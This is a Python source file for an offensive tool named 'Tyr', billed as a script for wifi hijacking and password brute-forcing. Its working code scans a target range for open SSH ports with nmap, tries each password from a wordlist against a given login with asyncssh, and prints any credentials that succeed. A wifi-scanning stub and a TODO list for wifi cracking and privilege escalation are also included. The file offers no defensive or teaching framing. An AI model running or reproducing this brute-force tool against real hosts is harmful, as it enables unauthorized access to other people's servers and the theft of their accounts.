#!/usr/bin/env python3

import asyncio
import asyncssh
import nmap
import netifaces
import pyrcrack
import argparse
import rich
from rich import print
from datetime import datetime
from rich.prompt import Prompt
from rich.console import Console

# TODO: 
# 1. Scan wifi
# 2. Bruteforce wifi password
# 3. Scan ports
# 4. Bruteforce ssh
# 5. Privilige escalation (?)

def print_info():
    print("[bold magenta]Tyr[/bold magenta] v1.0")
    print("Copyright (c) 2024, Buko")
    print("License: [red]GNU GPL[/red]")

async def scan_wifi(interface=None):
    airmon = pyrcrack.AirmonNg()
    if interface is None:
        interface = Prompt.ask('Select network interface', choices=[a['interface'] for a in await airmon.interfaces])

def scan_ports(ip_range):
    nm = nmap.PortScanner()
    nm.scan(hosts=ip_range, ports='22', arguments='-sT')
    return nm

async def main(args):
    nm = scan_ports(args.targets)
    for host in nm.all_hosts():
        if args.verbose: print(host, nm[host].state(), nm[host]['tcp'][22]['state'])
        if nm[host]['tcp'][22]['state'] == 'open':
            with open(args.password_file) as password_file:
                await ssh_bruteforce(host, password_file, args)

async def ssh_bruteforce(host, password_file, args):
    for password in password_file:
        password = password.strip()
        try:
            print('[blue]Trying password:[/blue]', password)
            
            async with asyncssh.connect(host, username=args.login, password=password, known_hosts=None) as conn:
                print('[green]Success![/green]', host)
                print('Login:', args.login)
                print('Password:', password)
        except Exception as err:
            print('[red]', err)

# Parse arguments
parser = argparse.ArgumentParser(prog='Tyr', description='A short script for wifi hijacking and password bruteforce')
parser.add_argument('--verbose', action='store_true')
parser.add_argument('--version', action='store_true')
parser.add_argument('--targets', type=str, required=True)
parser.add_argument('--password_file', type=str, required=True)
parser.add_argument('--login', type=str, required=True)
parser.add_argument('--interface', type=str)

args = parser.parse_args()
if args.version:
    print_info()
    exit()

# Run the script
asyncio.run(main(args))
